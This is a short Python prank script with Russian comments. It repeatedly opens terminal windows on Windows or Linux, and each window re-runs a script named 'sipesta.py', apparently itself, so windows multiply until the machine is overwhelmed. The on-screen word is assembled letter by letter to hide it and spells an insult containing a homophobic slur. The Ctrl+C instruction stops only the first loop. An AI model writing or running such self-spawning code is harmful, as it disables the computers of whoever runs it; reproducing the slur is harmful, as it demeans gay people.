import subprocess
import time
import os
import threading
import sys

# Слово для отображения
s = 'с'
i = 'и'
p = 'п'
e = 'е'
s2 = 'с'
t = 'т'
a = 'а'
t2 = 'т'
e2 = 'п'
b = 'и'
o = 'д'
r = 'р'

word = s + i + p + e + s2 + t + a + t2 + " " + e2 + b + o + r

def run_cmd_loop():
    """Функция для постоянного запуска cmd с командой"""
    while running:
        try:
            if sys.platform == "win32":
                # Для Windows
                subprocess.Popen(
                    f'start cmd /k "echo {word} && python sipesta.py"',
                    shell=True
                )
            else:
                # Для Linux/Mac (опционально)
                subprocess.Popen(
                    f'gnome-terminal -- bash -c "echo {word}; python3 sipesta.py; exec bash"',
                    shell=True
                )
            time.sleep(0.5)  # Небольшая задержка между запусками
        except:
            pass

# Флаг для контроля выполнения
running = True

print("Запуск бесконечного цикла cmd окон...")
print("Нажмите Ctrl+C в этом окне для остановки")

try:
    # Запускаем поток с бесконечным открытием окон
    thread = threading.Thread(target=run_cmd_loop)
    thread.daemon = True
    thread.start()
    
    # Бесконечный цикл, пока не нажмут Ctrl+C
    while True:
        time.sleep(1)
        
except KeyboardInterrupt:
    print("\nОстановка программы...")
    running = False
    print("Все окна больше не будут открываться")
    time.sleep(2)
